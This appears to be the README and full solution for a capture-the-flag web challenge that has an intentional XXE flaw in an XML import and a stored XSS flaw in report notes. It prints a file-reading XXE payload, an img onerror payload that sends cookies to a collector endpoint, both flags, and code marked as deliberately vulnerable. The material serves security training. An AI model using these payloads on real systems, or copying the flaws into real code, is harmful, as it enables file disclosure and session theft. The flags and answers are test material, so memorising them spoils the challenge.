# BugBoard Analytics – Dual Injection

**Category:** Web Exploitation  
**Difficulty:** Medium–Hard  
**Vulnerabilities:** XXE (CWE-611) + Stored XSS (CWE-79)

---

## Quick Start

```bash
cd bugboard_analytics
docker compose up --build
```

The challenge is served at **http://localhost:8080/**

> The admin triager bot starts ~8 s after the web service is healthy and
> re-visits `/reports.php` every **30 seconds**.

---

## Player Credentials

| Role   | Email                   | Password        |
|--------|-------------------------|-----------------|
| Tester | tester@bugboard.local   | test1234        |
| Admin  | *(bot-controlled only)* | *(not needed)*  |

---

## Flags

| Part | Flag                              |
|------|-----------------------------------|
| 1    | `BUGBOARD{xxe_file_disclosure}`   |
| 2    | `BUGBOARD{stored_xss_triage_pwn}` |

---

## Part 1 – XXE via XML Import

### Where

`/import.php` → posts to `/api/import_xml.php`

### Why it's vulnerable

The backend calls:

```php
@libxml_disable_entity_loader(false);   // re-enables external entities
$dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
```

Entity substitution is enabled, so a `SYSTEM` entity can read local files
and its contents are reflected back inside `parsedDesc`.

### Exploit

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bugreport [
  <!ENTITY xxe SYSTEM "file:///var/www/html/flag_xxe.txt">
]>
<bugreport>
  <title>Test XXE</title>
  <severity>low</severity>
  <description>&xxe;</description>
</bugreport>
```

Paste this into **Integrations → Import XML** and click  
**Validate & Preview Import**. The flag appears in the description preview.

---

## Part 2 – Stored XSS in Reports

### Where

`/new_report.php` (source) → `/reports.php` (sink, viewed by the bot)

### Why it's vulnerable

`reports.php` runs only this "sanitisation" before rendering Notes as raw HTML:

```php
preg_replace('/<\s*script\b[^>]*>[\s\S]*?<\/\s*script\s*>/i', '', $notes)
```

It strips `<script>` blocks but **not** event-handler attributes.

### Bot behaviour

The admin bot:
1. Logs in as `admin@bugboard.local` → server sets  
   `FLAG_XSS=BUGBOARD{stored_xss_triage_pwn}` as a **non-httpOnly** cookie.
2. Navigates to `/reports.php`.
3. Waits 4 s for JavaScript to execute.
4. Any XSS payload in a report's Notes field runs in the admin's browser.

### Exfil endpoint (built-in)

This challenge ships with a self-hosted collector:

| Endpoint      | Purpose                           |
|---------------|-----------------------------------|
| `/collect`    | Receives `?c=<data>` and logs it  |
| `/loot.php`   | Shows everything collected so far |

### Exploit (Notes field payload)

```html
<img src=x onerror="fetch('/collect?c='+encodeURIComponent(document.cookie))">
```

1. Go to **New Report**, fill in any title/URL, paste the payload into **Notes**.
2. Submit the report.
3. Wait up to 30 s for the bot to visit `/reports.php`.
4. Open **http://localhost:8080/loot.php** – you will see:
   ```
   FLAG_XSS=BUGBOARD{stored_xss_triage_pwn}
   ```

---

## Architecture

```
docker-compose
├── web  (php:7.4-apache)
│   ├── /var/www/html/         ← PHP application
│   │   ├── api/import_xml.php ← XXE endpoint
│   │   ├── reports.php        ← XSS sink
│   │   ├── collect.php        ← exfil collector
│   │   └── flag_xxe.txt       ← XXE flag
│   └── /var/www/data/
│       ├── database.db        ← SQLite (users + reports)
│       └── loot.json          ← collected XSS hits
└── bot  (node:18-slim + chromium)
    └── bot.js                 ← Puppeteer admin bot
```

---

## Hint Ladder (for CTFd)

1. "The Import feature says it's XML – what happens if you send a `<!DOCTYPE>` declaration?"
2. "Try a `SYSTEM` entity pointing to `file:///etc/passwd` first to confirm XXE."
3. "The flag file is at `/var/www/html/flag_xxe.txt`."
4. "Notes are 'sanitised'. Is `<script>` the only way to run JavaScript?"
5. "HTML event handlers (`onerror`, `onload`) also execute JS."
6. "The admin triager reviews all reports. Use `/collect` as your exfil server."

---

## Intentional Vulnerabilities (Do Not Fix)

- `www/api/import_xml.php` – `libxml_disable_entity_loader(false)` + `LIBXML_NOENT`
- `www/reports.php` – `sanitize_notes()` only strips `<script>` tags
- `www/includes/auth.php` – `FLAG_XSS` cookie set with `httponly: false` for admin
